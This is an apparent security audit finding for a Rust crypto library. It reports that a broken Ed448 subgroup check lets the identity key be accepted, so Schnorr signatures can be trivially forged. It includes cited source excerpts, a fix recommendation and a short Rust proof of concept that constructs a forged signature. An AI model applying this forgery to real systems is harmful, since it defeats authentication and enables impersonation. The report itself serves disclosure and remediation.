### Title
Ed448 accepts the identity and other small-order points, enabling trivial Schnorr forgeries - ([File: crypto/ed448/src/point.rs](crypto/ed448/src/point.rs))

### Summary
Ed448’s `Point::is_torsion_free` check is implemented as `(-P) + P == identity`, which is true for every point and therefore rejects nothing. [1](#0-0)  Consequently, `GroupEncoding::from_bytes` accepts the identity and small-order points as if they were prime-order Ed448 points. [2](#0-1) 

### Finding Description
`Ciphersuite::read_G` validates only decoding and canonical re-encoding; it does not reject the identity. [3](#0-2)  `SchnorrSignature::verify` checks the equation `R + cA - sG == identity`. [4](#0-3)  For an accepted identity public key `A`, the `cA` term is always identity, so any `(R, s)` satisfying `R = sG` verifies regardless of the challenge. [5](#0-4) 

### Impact Explanation
An unprivileged party can supply an Ed448 identity public key and a syntactically valid signature `(sG, s)` that passes `SchnorrSignature::verify` for every challenge and every message/challenge derivation using that key. [6](#0-5) [4](#0-3)  This is a concrete signature forgery whenever an application accepts Ed448 public keys through the generic canonical `read_G` path instead of rejecting identity separately. [3](#0-2) 

### Likelihood Explanation
The attacker only needs to cause verification under the identity key and provide canonically encoded `R = sG` and `s`; no private key or malformed encoding is required. [7](#0-6) [5](#0-4)  The defective subgroup check makes this reachable for every Ed448 decoding using `Ciphersuite::read_G`. [8](#0-7) 

### Recommendation
Fix `Point::is_torsion_free` to multiply the point by the Ed448 prime-order subgroup order or the curve cofactor and require the expected result, rather than evaluating `(-P) + P`. [8](#0-7)  Additionally, reject identity in `from_bytes` or provide an explicit strict public-key reader used by signature verification. [3](#0-2) 

### Proof of Concept
```rust
use ciphersuite::Ciphersuite;
use ed448::Ed448;
use schnorr::SchnorrSignature;
use group::Group;

// Any attacker-selected scalar works.
let s = <Ed448 as Ciphersuite>::F::ONE;

// A = identity is accepted by Ed448::read_G because is_torsion_free
// evaluates (-A) + A, which is always identity.
let public_key = <Ed448 as Ciphersuite>::G::identity();

// R = sG, so R + cA - sG = identity for every challenge c.
let forged = SchnorrSignature::<Ed448> {
  R: <Ed448 as Ciphersuite>::generator() * s,
  s,
};

assert!(forged.verify(public_key, <Ed448 as Ciphersuite>::F::ZERO));
assert!(forged.verify(public_key, <Ed448 as Ciphersuite>::F::ONE));
```

The forged proof follows directly from the verification equation, where multiplication by the accepted identity key removes the challenge-bound public-key term. [8](#0-7) [4](#0-3)

### Citations

**File:** crypto/ed448/src/point.rs (L294-317)
```rust
impl Point {
  fn is_torsion_free(&self) -> Choice {
    ((*self * (Scalar::ZERO - Scalar::ONE)) + self).is_identity()
  }
}

impl GroupEncoding for Point {
  type Repr = <FieldElement as PrimeField>::Repr;

  fn from_bytes(bytes: &Self::Repr) -> CtOption<Self> {
    // Extract and clear the sign bit
    let sign = Choice::from(bytes[56] >> 7);
    let mut bytes = *bytes;
    let mut_ref: &mut [u8] = bytes.as_mut();
    mut_ref[56] &= !(1 << 7);

    // Parse y, recover x
    FieldElement::from_repr(bytes).and_then(|y| {
      recover_x(y).and_then(|mut x| {
        x.conditional_negate(x.is_odd().ct_eq(&!sign));
        let not_negative_zero = !(x.is_zero() & sign);
        let point = Point { x, y, z: FieldElement::ONE };
        CtOption::new(point, not_negative_zero & point.is_torsion_free())
      })
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/schnorr/src/lib.rs (L49-59)
```rust
impl<C: Ciphersuite> SchnorrSignature<C> {
  /// Read a SchnorrSignature from something implementing Read.
  pub fn read<R: Read>(reader: &mut R) -> io::Result<Self> {
    Ok(SchnorrSignature { R: C::read_G(reader)?, s: C::read_F(reader)? })
  }

  /// Write a SchnorrSignature to something implementing Read.
  pub fn write<W: Write>(&self, writer: &mut W) -> io::Result<()> {
    writer.write_all(self.R.to_bytes().as_ref())?;
    writer.write_all(self.s.to_repr().as_ref())
  }
```

**File:** crypto/schnorr/src/lib.rs (L86-109)
```rust
  /// Return the series of pairs whose products sum to zero for a valid signature.
  /// This is intended to be used with a multiexp.
  pub fn batch_statements(&self, public_key: C::G, challenge: C::F) -> [(C::F, C::G); 3] {
    // s = r + ca
    // sG == R + cA
    // R + cA - sG == 0
    [
      // R
      (C::F::ONE, self.R),
      // cA
      (challenge, public_key),
      // -sG
      (-self.s, C::generator()),
    ]
  }

  /// Verify a Schnorr signature for the given key with the specified challenge.
  ///
  /// This challenge must be properly crafted, which means being binding to the public key, nonce,
  /// and any message. Failure to do so will let a malicious adversary to forge signatures for
  /// different keys/messages.
  #[must_use]
  pub fn verify(&self, public_key: C::G, challenge: C::F) -> bool {
    multiexp_vartime(&self.batch_statements(public_key, challenge)).is_identity().into()
```
